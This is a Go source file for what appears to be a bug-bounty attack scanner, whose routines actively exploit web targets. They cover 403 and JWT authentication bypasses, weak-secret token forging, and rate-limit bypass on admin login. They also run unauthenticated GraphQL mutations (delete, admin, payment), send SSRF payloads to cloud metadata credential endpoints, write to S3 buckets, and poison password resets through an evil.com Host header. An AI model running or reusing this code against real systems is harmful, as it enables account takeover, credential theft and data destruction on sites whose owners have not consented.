package scanner

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"sync"

	"github.com/zanicool/apex-cli/pkg/crawler"
	"github.com/zanicool/apex-cli/pkg/engine"
	"github.com/zanicool/apex-cli/pkg/oob"
)

// ==========================================================================
// BOUNTY KILLER: Techniques that actually pay on HackerOne
// ==========================================================================

// --- 403 Bypass with multiple techniques ---

func scan403Bypass(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	// Collect 403 endpoints from crawl
	var forbidden []string
	for _, page := range crawl.Pages {
		if page.StatusCode == 403 || page.StatusCode == 401 {
			forbidden = append(forbidden, page.URL)
		}
	}

	for _, target := range forbidden {
		wg.Add(1)
		go func(u string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			parsed, err := url.Parse(u)
			if err != nil {
				return
			}
			path := parsed.Path
			base := parsed.Scheme + "://" + parsed.Host

			// Path manipulation bypasses
			pathBypasses := []string{
				path + "/",
				path + "/.",
				path + "/..",
				path + "/./",
				"/" + path,
				path + "%20",
				path + "%09",
				path + "?",
				path + "??",
				path + "#",
				path + "..;/",
				strings.ToUpper(path),
				path + ";",
				"/.;/" + strings.TrimPrefix(path, "/"),
				"/..;/" + strings.TrimPrefix(path, "/"),
			}

			for _, bypass := range pathBypasses {
				testURL := base + bypass
				resp := http.Get(testURL)
				if resp.Err == nil && resp.StatusCode == 200 && len(resp.Body) > 100 {
					mu.Lock()
					findings = append(findings, Finding{
						Type: "403 Bypass — Path Manipulation", Severity: "high",
						URL: testURL, Detail: fmt.Sprintf("Original %s returned 403, bypass returned %d (%d bytes)", path, resp.StatusCode, resp.Size),
						Template: "apex-403-bypass",
					})
					mu.Unlock()
					return
				}
			}

			// Header bypasses
			headerBypasses := []map[string]string{
				{"X-Original-URL": path},
				{"X-Rewrite-URL": path},
				{"X-Forwarded-For": "127.0.0.1"},
				{"X-Custom-IP-Authorization": "127.0.0.1"},
				{"X-Forwarded-Host": "localhost"},
				{"X-Remote-IP": "127.0.0.1"},
				{"X-Client-IP": "127.0.0.1"},
				{"X-Real-IP": "127.0.0.1"},
				{"X-Originating-IP": "127.0.0.1"},
				{"X-Forwarded-Port": "443"},
				{"X-Forwarded-Scheme": "https"},
			}

			for _, headers := range headerBypasses {
				items := []engine.RequestItem{{URL: base + "/", Method: "GET", Headers: headers}}
				for resp := range http.BatchRequest(items, 1) {
					if resp.Err == nil && resp.StatusCode == 200 && len(resp.Body) > 100 {
						headerName := ""
						for k := range headers {
							headerName = k
						}
						mu.Lock()
						findings = append(findings, Finding{
							Type: "403 Bypass — Header Override", Severity: "high",
							URL: u, Detail: fmt.Sprintf("Bypassed with %s header", headerName),
							Payload: fmt.Sprintf("%s: %s", headerName, headers[headerName]),
							Template: "apex-403-bypass-header",
						})
						mu.Unlock()
						return
					}
				}
			}

			// Method override
			methods := []string{"POST", "PUT", "PATCH", "DELETE", "OPTIONS", "TRACE"}
			for _, method := range methods {
				items := []engine.RequestItem{{URL: u, Method: method}}
				for resp := range http.BatchRequest(items, 1) {
					if resp.Err == nil && resp.StatusCode == 200 && len(resp.Body) > 100 {
						mu.Lock()
						findings = append(findings, Finding{
							Type: "403 Bypass — HTTP Method", Severity: "high",
							URL: u, Detail: fmt.Sprintf("GET returned 403, %s returned 200", method),
							Template: "apex-403-bypass-method",
						})
						mu.Unlock()
						return
					}
				}
			}
		}(target)
	}
	wg.Wait()
	return findings
}

// --- JWT Attack Suite ---

func scanJWTAttacks(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding

	// Extract JWTs from responses
	jwtRe := regexp.MustCompile(`eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+`)

	for _, page := range crawl.Pages[:min(30, len(crawl.Pages))] {
		resp := http.Get(page.URL)
		if resp.Err != nil {
			continue
		}

		// Check body and headers for JWTs
		sources := []string{resp.Body}
		for _, vals := range resp.Headers {
			sources = append(sources, vals...)
		}

		for _, src := range sources {
			tokens := jwtRe.FindAllString(src, -1)
			for _, token := range tokens {
				findings = append(findings, attackJWTAdvanced(http, page.URL, token)...)
			}
		}
	}
	return findings
}

func attackJWTAdvanced(http *engine.HTTPClient, pageURL, token string) []Finding {
	var findings []Finding
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return findings
	}

	// Decode header to get original algorithm
	headerJSON, _ := base64.RawURLEncoding.DecodeString(parts[0])
	origHeader := string(headerJSON)

	// Test 1: alg:none
	noneToken := "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0." + parts[1] + "."
	items := []engine.RequestItem{{
		URL: pageURL, Method: "GET",
		Headers: map[string]string{"Authorization": "Bearer " + noneToken},
	}}
	for resp := range http.BatchRequest(items, 1) {
		if resp.Err == nil && resp.StatusCode == 200 {
			findings = append(findings, Finding{
				Type: "JWT Algorithm None Bypass", Severity: "critical",
				URL: pageURL, Payload: "alg:none",
				Detail:   "Server accepts JWT with algorithm set to 'none' — authentication bypass",
				Template: "apex-jwt-none",
			})
		}
	}

	// Test 2: empty signature
	emptyToken := parts[0] + "." + parts[1] + "."
	items = []engine.RequestItem{{
		URL: pageURL, Method: "GET",
		Headers: map[string]string{"Authorization": "Bearer " + emptyToken},
	}}
	for resp := range http.BatchRequest(items, 1) {
		if resp.Err == nil && resp.StatusCode == 200 {
			findings = append(findings, Finding{
				Type: "JWT Empty Signature Accepted", Severity: "critical",
				URL: pageURL, Payload: "empty signature",
				Detail:   "Server accepts JWT with empty signature",
				Template: "apex-jwt-empty-sig",
			})
		}
	}

	// Test 3: Weak secret cracking (HMAC)
	if strings.Contains(origHeader, "HS256") || strings.Contains(origHeader, "HS384") || strings.Contains(origHeader, "HS512") {
		weakSecrets := []string{
			"secret", "password", "123456", "changeme", "test", "key",
			"jwt_secret", "supersecret", "admin", "default", "1234567890",
			"your-256-bit-secret", "my-secret-key", "jwt-secret",
			"shhhhh", "passw0rd", "qwerty", "letmein",
		}
		for _, secret := range weakSecrets {
			forgedToken := forgeJWT(parts[0], parts[1], secret)
			if forgedToken == "" {
				continue
			}
			items := []engine.RequestItem{{
				URL: pageURL, Method: "GET",
				Headers: map[string]string{"Authorization": "Bearer " + forgedToken},
			}}
			for resp := range http.BatchRequest(items, 1) {
				if resp.Err == nil && resp.StatusCode == 200 {
					findings = append(findings, Finding{
						Type: "JWT Weak Secret", Severity: "critical",
						URL: pageURL, Payload: "secret: " + secret,
						Detail:   fmt.Sprintf("JWT signed with weak secret '%s' — forge tokens for any user", secret),
						Evidence: forgedToken[:50] + "...",
						Template: "apex-jwt-weak-secret",
					})
					return findings // one is enough
				}
			}
		}
	}

	return findings
}

// forgeJWT creates a JWT with the given header, payload, and HMAC-SHA256 secret
func forgeJWT(header, payload, secret string) string {
	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write([]byte(header + "." + payload))
	sig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	return header + "." + payload + "." + sig
}

// --- API Versioning Bypass (access deprecated/unprotected endpoints) ---

func scanAPIVersionBypass(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	versionRe := regexp.MustCompile(`/v(\d+)/`)

	for _, page := range crawl.Pages {
		matches := versionRe.FindStringSubmatch(page.URL)
		if len(matches) < 2 {
			continue
		}

		wg.Add(1)
		go func(u string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			// Try older API versions (often less protected)
			for _, v := range []string{"v1", "v0", "v2", "v3"} {
				testURL := versionRe.ReplaceAllString(u, "/"+v+"/")
				if testURL == u {
					continue
				}
				resp := http.Get(testURL)
				if resp.Err == nil && resp.StatusCode == 200 && len(resp.Body) > 50 {
					origResp := http.Get(u)
					if origResp.Err == nil && (origResp.StatusCode == 401 || origResp.StatusCode == 403) {
						mu.Lock()
						findings = append(findings, Finding{
							Type: "API Version Bypass — Auth Bypass", Severity: "high",
							URL: testURL, Detail: fmt.Sprintf("Current version (%s) requires auth, older version (%s) does not", u, testURL),
							Template: "apex-api-version-bypass",
						})
						mu.Unlock()
					}
				}
			}
		}(page.URL)
	}
	wg.Wait()
	return findings
}

// --- Rate Limit Bypass ---

func scanRateLimitBypass(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding

	// Find login/auth endpoints
	authEndpoints := []string{}
	for _, page := range crawl.Pages {
		u := strings.ToLower(page.URL)
		if strings.Contains(u, "login") || strings.Contains(u, "auth") ||
			strings.Contains(u, "signin") || strings.Contains(u, "reset") {
			authEndpoints = append(authEndpoints, page.URL)
		}
	}
	for _, form := range crawl.Forms {
		if strings.Contains(strings.ToLower(form.Action), "login") ||
			strings.Contains(strings.ToLower(form.Action), "auth") {
			authEndpoints = append(authEndpoints, form.Action)
		}
	}

	if len(authEndpoints) == 0 {
		return findings
	}

	target := authEndpoints[0]

	// Bypass techniques
	bypasses := []struct {
		name    string
		headers map[string]string
	}{
		{"X-Forwarded-For rotation", map[string]string{"X-Forwarded-For": "1.2.3.4"}},
		{"X-Real-IP rotation", map[string]string{"X-Real-IP": "5.6.7.8"}},
		{"X-Originating-IP", map[string]string{"X-Originating-IP": "9.10.11.12"}},
		{"Null byte in path", nil},
		{"Case change", nil},
	}

	// First: trigger rate limit with 20 rapid requests
	for i := 0; i < 20; i++ {
		http.Post(target, "application/x-www-form-urlencoded", "username=admin&password=wrong"+fmt.Sprintf("%d", i))
	}

	// Then try bypasses
	for _, bypass := range bypasses {
		var resp *engine.Response
		if bypass.headers != nil {
			items := []engine.RequestItem{{
				URL: target, Method: "POST", Body: "username=admin&password=test",
				Headers: bypass.headers,
			}}
			for r := range http.BatchRequest(items, 1) {
				resp = r
			}
		} else {
			resp = http.Post(target, "application/x-www-form-urlencoded", "username=admin&password=test")
		}

		if resp != nil && resp.Err == nil && resp.StatusCode != 429 && resp.StatusCode < 500 {
			findings = append(findings, Finding{
				Type: "Rate Limit Bypass on Auth Endpoint", Severity: "medium",
				URL: target, Detail: fmt.Sprintf("Bypass via %s — server returned %d after rate limit triggered", bypass.name, resp.StatusCode),
				Template: "apex-rate-limit-bypass",
			})
			break
		}
	}
	return findings
}

// --- GraphQL Introspection + Abuse ---

func scanGraphQL(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	if len(crawl.Pages) == 0 {
		return findings
	}

	base := strings.Split(crawl.Pages[0].URL, "/")[0] + "//" + strings.Split(crawl.Pages[0].URL, "/")[2]
	gqlPaths := []string{"/graphql", "/graphiql", "/api/graphql", "/v1/graphql", "/query"}

	introspectionQuery := `{"query":"{ __schema { types { name fields { name type { name } } } } }"}`

	for _, path := range gqlPaths {
		gqlURL := base + path
		resp := http.Post(gqlURL, "application/json", introspectionQuery)
		if resp.Err != nil || resp.StatusCode != 200 {
			continue
		}

		if strings.Contains(resp.Body, "__schema") || strings.Contains(resp.Body, "types") {
			findings = append(findings, Finding{
				Type: "GraphQL Introspection Enabled", Severity: "medium",
				URL: gqlURL, Detail: "Full schema exposed — enumerate all queries, mutations, and types",
				Template: "apex-graphql-introspection",
			})

			// Parse schema for sensitive mutations and test them without auth
			sensitiveMutations := extractSensitiveMutations(resp.Body)
			for _, m := range sensitiveMutations {
				// Try executing the mutation without auth
				mutQuery := fmt.Sprintf(`{"query":"mutation { %s }"}`, m)
				mutResp := http.Post(gqlURL, "application/json", mutQuery)
				if mutResp.Err == nil && mutResp.StatusCode == 200 && !strings.Contains(mutResp.Body, "unauthorized") && !strings.Contains(mutResp.Body, "forbidden") && !strings.Contains(mutResp.Body, "not authenticated") {
					sev := "high"
					if strings.Contains(strings.ToLower(m), "delete") || strings.Contains(strings.ToLower(m), "admin") || strings.Contains(strings.ToLower(m), "user") {
						sev = "critical"
					}
					findings = append(findings, Finding{
						Type: "GraphQL Mutation Without Auth", Severity: sev,
						URL: gqlURL, Payload: m,
						Detail:   fmt.Sprintf("Mutation '%s' executable without authentication", m),
						Template: "apex-graphql-noauth",
					})
				}
			}

			// Test batch query attack (DoS / rate limit bypass)
			batchQuery := `[{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"}]`
			batchResp := http.Post(gqlURL, "application/json", batchQuery)
			if batchResp.Err == nil && batchResp.StatusCode == 200 && strings.Contains(batchResp.Body, "__typename") {
				findings = append(findings, Finding{
					Type: "GraphQL Batch Query Allowed", Severity: "medium",
					URL: gqlURL, Detail: "Batch queries accepted — can bypass rate limiting and brute-force in single request",
					Template: "apex-graphql-batch",
				})
			}

			// Test deep nesting (DoS)
			deepQuery := `{"query":"{ __schema { types { fields { type { fields { type { fields { name } } } } } } } }"}`
			deepResp := http.Post(gqlURL, "application/json", deepQuery)
			if deepResp.Err == nil && deepResp.StatusCode == 200 && deepResp.Duration.Seconds() > 3 {
				findings = append(findings, Finding{
					Type: "GraphQL Deep Query DoS", Severity: "medium",
					URL: gqlURL, Detail: fmt.Sprintf("Deep nested query took %.1fs — no depth limiting", deepResp.Duration.Seconds()),
					Template: "apex-graphql-dos",
				})
			}
			break
		}
	}
	return findings
}

func extractSensitiveMutations(body string) []string {
	var sensitive []string
	keywords := []string{"delete", "admin", "role", "permission", "user", "password", "transfer", "payment", "execute"}

	var schema struct {
		Data struct {
			Schema struct {
				Types []struct {
					Name   string `json:"name"`
					Fields []struct {
						Name string `json:"name"`
					} `json:"fields"`
				} `json:"types"`
			} `json:"__schema"`
		} `json:"data"`
	}
	if json.Unmarshal([]byte(body), &schema) != nil {
		return sensitive
	}

	for _, t := range schema.Data.Schema.Types {
		if strings.Contains(strings.ToLower(t.Name), "mutation") {
			for _, f := range t.Fields {
				for _, kw := range keywords {
					if strings.Contains(strings.ToLower(f.Name), kw) {
						sensitive = append(sensitive, f.Name)
						break
					}
				}
			}
		}
	}
	return sensitive
}

// --- Cloud Metadata SSRF ---

func scanCloudMetadata(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	ssrfParams := []string{"url", "uri", "link", "src", "source", "fetch", "request",
		"proxy", "redirect", "image", "avatar", "webhook", "callback", "dest"}

	// Cloud metadata endpoints with bypass techniques
	metadataPayloads := []struct {
		payload string
		detect  string
		cloud   string
	}{
		// AWS - standard
		{"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AccessKeyId", "AWS"},
		{"http://169.254.169.254/latest/meta-data/", "ami-id", "AWS"},
		// AWS - IMDSv2 bypass attempts
		{"http://169.254.169.254/latest/api/token", "token", "AWS"},
		// AWS - IP obfuscation
		{"http://2852039166/latest/meta-data/", "ami-id", "AWS"},
		{"http://0xA9FEA9FE/latest/meta-data/", "ami-id", "AWS"},
		{"http://[::ffff:169.254.169.254]/latest/meta-data/", "ami-id", "AWS"},
		// GCP
		{"http://metadata.google.internal/computeMetadata/v1/project/project-id", "", "GCP"},
		{"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", "access_token", "GCP"},
		// Azure
		{"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute", "Azure"},
		// DigitalOcean
		{"http://169.254.169.254/metadata/v1/", "droplet", "DigitalOcean"},
	}

	for u, params := range crawl.Params {
		// Skip static assets
		uLower := strings.ToLower(u)
		if strings.Contains(uLower, ".js") || strings.Contains(uLower, ".css") || strings.Contains(uLower, ".png") || strings.Contains(uLower, ".svg") || strings.Contains(uLower, ".woff") {
			continue
		}
		// Only test actual URL endpoints
		if !strings.Contains(u, "?") && !strings.Contains(u, "/api") {
			continue
		}
		for _, p := range params {
			pLower := strings.ToLower(p)
			isSSRF := false
			for _, sp := range ssrfParams {
				if strings.Contains(pLower, sp) {
					isSSRF = true
					break
				}
			}
			if !isSSRF {
				continue
			}

			for _, meta := range metadataPayloads {
				wg.Add(1)
				go func(baseURL, param string, m struct {
					payload string
					detect  string
					cloud   string
				}) {
					defer wg.Done()
					sem <- struct{}{}
					defer func() { <-sem }()

					testURL := injectParam(baseURL, param, m.payload)

					// For GCP, need Metadata-Flavor header
					var resp *engine.Response
					if m.cloud == "GCP" {
						items := []engine.RequestItem{{
							URL: testURL, Method: "GET",
							Headers: map[string]string{"Metadata-Flavor": "Google"},
						}}
						for r := range http.BatchRequest(items, 1) {
							resp = r
						}
					} else {
						resp = http.Get(testURL)
					}

					if resp == nil || resp.Err != nil || engine.IsWAFChallenge(resp) {
						return
					}

					bodyLower := strings.ToLower(resp.Body)
					if m.detect != "" && strings.Contains(bodyLower, strings.ToLower(m.detect)) {
						mu.Lock()
						findings = append(findings, Finding{
							Type: fmt.Sprintf("SSRF → %s Cloud Metadata", m.cloud), Severity: "critical",
							URL: testURL, Param: param, Payload: m.payload,
							Evidence: resp.Body[:min(300, len(resp.Body))],
							Detail:   fmt.Sprintf("Cloud credentials leaked via SSRF to %s metadata endpoint", m.cloud),
							Template: "apex-ssrf-cloud",
						})
						mu.Unlock()
					}
				}(u, p, meta)
			}
		}
	}
	wg.Wait()
	return findings
}

// --- Subdomain Takeover ---

func scanSubdomainTakeover(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	// Fingerprints for takeover-vulnerable services
	takeoverSigs := map[string][]string{
		"GitHub Pages":     {"There isn't a GitHub Pages site here"},
		"Heroku":           {"No such app", "herokucdn.com/error-pages"},
		"AWS S3":           {"NoSuchBucket", "The specified bucket does not exist"},
		"Shopify":          {"Sorry, this shop is currently unavailable"},
		"Tumblr":           {"There's nothing here", "Whatever you were looking for doesn't currently exist"},
		"WordPress.com":    {"Do you want to register"},
		"Fastly":           {"Fastly error: unknown domain"},
		"Pantheon":         {"404 error unknown site"},
		"Zendesk":          {"Help Center Closed"},
		"Bitbucket":        {"Repository not found"},
		"Ghost":            {"The thing you were looking for is no longer here"},
		"Surge.sh":         {"project not found"},
		"Fly.io":           {"404 Not Found"},
		"Netlify":          {"Not Found - Request ID"},
		"Azure":            {"404 Web Site not found"},
		"Google Cloud Run": {"default backend - 404"},
	}

	// Check all crawled pages + subdomains that returned errors
	var targets []string
	for _, page := range crawl.Pages {
		targets = append(targets, page.URL)
	}

	for _, target := range targets {
		wg.Add(1)
		go func(u string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			resp := http.Get(u)
			if resp.Err != nil {
				// DNS resolution failure = potential takeover
				if strings.Contains(resp.Err.Error(), "no such host") ||
					strings.Contains(resp.Err.Error(), "NXDOMAIN") {
					mu.Lock()
					findings = append(findings, Finding{
						Type: "Subdomain Takeover — Dangling DNS", Severity: "high",
						URL: u, Detail: "DNS points to non-existent host — register the service to claim this subdomain",
						Template: "apex-subdomain-takeover",
					})
					mu.Unlock()
				}
				return
			}

			bodyLower := strings.ToLower(resp.Body)
			for service, sigs := range takeoverSigs {
				for _, sig := range sigs {
					if strings.Contains(bodyLower, strings.ToLower(sig)) {
						mu.Lock()
						findings = append(findings, Finding{
							Type: fmt.Sprintf("Subdomain Takeover — %s", service), Severity: "high",
							URL: u, Evidence: sig,
							Detail:   fmt.Sprintf("Service (%s) is unclaimed — subdomain can be taken over", service),
							Template: "apex-subdomain-takeover",
						})
						mu.Unlock()
						return
					}
				}
			}
		}(target)
	}
	wg.Wait()
	return findings
}

// --- S3 Bucket Misconfiguration ---

func scanS3Buckets(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	// Extract bucket names from responses
	bucketRe := regexp.MustCompile(`([a-z0-9][a-z0-9\-]{1,61}[a-z0-9])\.s3[.\-](?:amazonaws\.com|[a-z0-9\-]+\.amazonaws\.com)`)
	bucketRe2 := regexp.MustCompile(`s3[.\-](?:[a-z0-9\-]+\.)?amazonaws\.com/([a-z0-9][a-z0-9\-]{1,61}[a-z0-9])`)

	buckets := make(map[string]bool)
	for _, page := range crawl.Pages {
		resp := http.Get(page.URL)
		if resp.Err != nil {
			continue
		}
		for _, m := range bucketRe.FindAllStringSubmatch(resp.Body, -1) {
			buckets[m[1]] = true
		}
		for _, m := range bucketRe2.FindAllStringSubmatch(resp.Body, -1) {
			buckets[m[1]] = true
		}
	}

	for bucket := range buckets {
		wg.Add(1)
		go func(b string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			// Test listing
			listURL := fmt.Sprintf("https://%s.s3.amazonaws.com/", b)
			resp := http.Get(listURL)
			if resp.Err == nil && resp.StatusCode == 200 && strings.Contains(resp.Body, "<ListBucketResult") {
				mu.Lock()
				findings = append(findings, Finding{
					Type: "S3 Bucket — Public Listing", Severity: "high",
					URL: listURL, Detail: fmt.Sprintf("Bucket '%s' allows public listing of all objects", b),
					Template: "apex-s3-listing",
				})
				mu.Unlock()
			}

			// Test write (PUT a harmless file)
			putURL := fmt.Sprintf("https://%s.s3.amazonaws.com/apex-test-write.txt", b)
			items := []engine.RequestItem{{URL: putURL, Method: "PUT", Body: "apex-security-test"}}
			for putResp := range http.BatchRequest(items, 1) {
				if putResp.Err == nil && putResp.StatusCode == 200 {
					mu.Lock()
					findings = append(findings, Finding{
						Type: "S3 Bucket — Public Write", Severity: "critical",
						URL: putURL, Detail: fmt.Sprintf("Bucket '%s' allows public write — full compromise possible", b),
						Template: "apex-s3-write",
					})
					mu.Unlock()
				}
			}
		}(bucket)
	}
	wg.Wait()
	return findings
}

// --- Account Takeover via Password Reset ---

func scanPasswordResetPoison(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding

	// Find password reset endpoints
	var resetURLs []string
	for _, page := range crawl.Pages {
		u := strings.ToLower(page.URL)
		if strings.Contains(u, "reset") || strings.Contains(u, "forgot") || strings.Contains(u, "recover") {
			resetURLs = append(resetURLs, page.URL)
		}
	}
	for _, form := range crawl.Forms {
		if strings.Contains(strings.ToLower(form.Action), "reset") ||
			strings.Contains(strings.ToLower(form.Action), "forgot") {
			resetURLs = append(resetURLs, form.Action)
		}
	}

	for _, resetURL := range resetURLs[:min(3, len(resetURLs))] {
		// Host header poisoning on password reset
		items := []engine.RequestItem{
			{
				URL: resetURL, Method: "POST",
				Body:    "email=test@example.com",
				Headers: map[string]string{"Host": "evil.com", "Content-Type": "application/x-www-form-urlencoded"},
			},
			{
				URL: resetURL, Method: "POST",
				Body:    "email=test@example.com",
				Headers: map[string]string{"X-Forwarded-Host": "evil.com", "Content-Type": "application/x-www-form-urlencoded"},
			},
		}

		for resp := range http.BatchRequest(items, 1) {
			if resp.Err == nil && resp.StatusCode == 200 {
				// Check if response mentions the poisoned host
				if strings.Contains(resp.Body, "evil.com") || strings.Contains(resp.Body, "reset link") {
					findings = append(findings, Finding{
						Type: "Account Takeover — Password Reset Poisoning", Severity: "critical",
						URL: resetURL, Detail: "Host header reflected in password reset link — attacker receives victim's reset token",
						Template: "apex-reset-poison",
					})
				}
			}
		}
	}
	return findings
}
